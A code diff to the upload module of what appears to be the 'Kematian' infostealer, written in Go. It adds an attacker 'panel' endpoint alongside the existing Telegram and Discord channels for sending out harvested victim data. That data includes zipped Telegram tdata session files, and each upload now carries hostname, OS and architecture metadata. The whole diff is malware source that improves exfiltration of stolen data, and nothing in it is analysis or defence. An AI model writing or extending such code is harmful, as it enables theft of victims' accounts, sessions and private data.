@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"log"
+	"strings"
 
 	"recovery/recovery"
 )
@@ -103,7 +104,9 @@ func uploadVictimTelegram(cfg uploadConfig, baseFilename string, p *harvestPaylo
 			log.Printf("[kematian] uploading victim telegram tdata %s (%d bytes)", filename, len(zipData))
 		}
 
-		if err := uploadSingleFile(cfg, "Kematian Telegram tdata", caption, filename, zipData); err != nil {
+		if err := uploadSingleFile(cfg, "Kematian Telegram tdata", caption, filename, zipData, uploadFileContext{
+			Phase: "telegram",
+		}); err != nil {
 			return fmt.Errorf("upload telegram tdata %s: %w", session.Account, err)
 		}
 		uploaded++
@@ -141,7 +144,11 @@ func uploadZipChunks(cfg uploadConfig, baseFilename, title, summary string, chun
 			log.Printf("[kematian] uploading %s (%d bytes)", filename, len(zipData))
 		}
 
-		if err := uploadSingleFile(cfg, title, partSummary, filename, zipData); err != nil {
+		if err := uploadSingleFile(cfg, title, partSummary, filename, zipData, uploadFileContext{
+			Phase:     phaseLabel,
+			PartNum:   i + 1,
+			PartTotal: len(chunks),
+		}); err != nil {
 			return fmt.Errorf("upload %s: %w", filename, err)
 		}
 		uploadDelay(cfg)
@@ -149,7 +156,13 @@ func uploadZipChunks(cfg uploadConfig, baseFilename, title, summary string, chun
 	return nil
 }
 
-func uploadSingleFile(cfg uploadConfig, title, summary, filename string, data []byte) error {
+type uploadFileContext struct {
+	Phase     string
+	PartNum   int
+	PartTotal int
+}
+
+func uploadSingleFile(cfg uploadConfig, title, summary, filename string, data []byte, ctx uploadFileContext) error {
 	var errs []string
 
 	if cfg.useTelegram() {
@@ -168,13 +181,24 @@ func uploadSingleFile(cfg uploadConfig, title, summary, filename string, data []
 		}
 	}
 
+	if cfg.usePanel() {
+		meta := panelUploadMeta{
+			Hostname:  cfg.Hostname,
+			OS:        cfg.OS,
+			Arch:      cfg.Arch,
+			Phase:     ctx.Phase,
+			PartNum:   ctx.PartNum,
+			PartTotal: ctx.PartTotal,
+		}
+		if err := sendPanelUpload(cfg.PanelURL, cfg.PanelAPIKey, title, summary, filename, data, meta); err != nil {
+			errs = append(errs, "panel: "+err.Error())
+		}
+	}
+
 	if len(errs) == 0 {
 		return nil
 	}
-	if cfg.useTelegram() && !cfg.useDiscord() {
-		return fmt.Errorf("%s", errs[0])
-	}
-	if cfg.useDiscord() && !cfg.useTelegram() {
+	if len(errs) == 1 {
 		return fmt.Errorf("%s", errs[0])
 	}
 	return fmt.Errorf("%s", joinErrors(errs))
@@ -190,14 +214,20 @@ func uploadDelay(cfg uploadConfig) {
 }
 
 func uploadDestLabel(cfg uploadConfig) string {
-	switch {
-	case cfg.useDiscord() && cfg.useTelegram():
-		return "telegram+discord"
-	case cfg.useTelegram():
-		return "telegram"
-	default:
-		return "discord"
+	var parts []string
+	if cfg.usePanel() {
+		parts = append(parts, "panel")
 	}
+	if cfg.useTelegram() {
+		parts = append(parts, "telegram")
+	}
+	if cfg.useDiscord() {
+		parts = append(parts, "discord")
+	}
+	if len(parts) == 0 {
+		return "none"
+	}
+	return strings.Join(parts, "+")
 }
 
 func joinErrors(errs []string) string {
